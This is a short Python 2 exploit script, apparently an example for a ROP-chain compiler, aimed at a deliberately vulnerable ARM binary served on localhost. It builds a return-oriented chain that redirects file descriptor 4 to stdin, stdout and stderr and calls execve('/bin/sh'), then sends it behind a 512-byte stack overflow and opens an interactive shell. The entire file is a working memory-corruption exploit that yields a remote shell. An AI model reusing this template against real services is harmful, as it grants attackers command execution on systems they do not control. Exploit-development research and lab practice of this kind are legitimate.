import sys, logging
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './arm_bof_execve'
p = remote('localhost', 2222)

print "Using automatically built ROP chain"
files = [(filename, None, 0)]
goals = [
  ["function", "dup2", 4, 0],
  ["function", "dup2", 4, 1],
  ["function", "dup2", 4, 2],
  ["execve", "/bin/sh"]
]
rop = ropme.rop(files, [], goals, archinfo.ArchARM(), log_level = logging.DEBUG)

payload = 'A'*512 + 'B'*4 + rop
payload += ((700 - len(payload)) * 'B')
payload += "JEFF" # To end our input

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
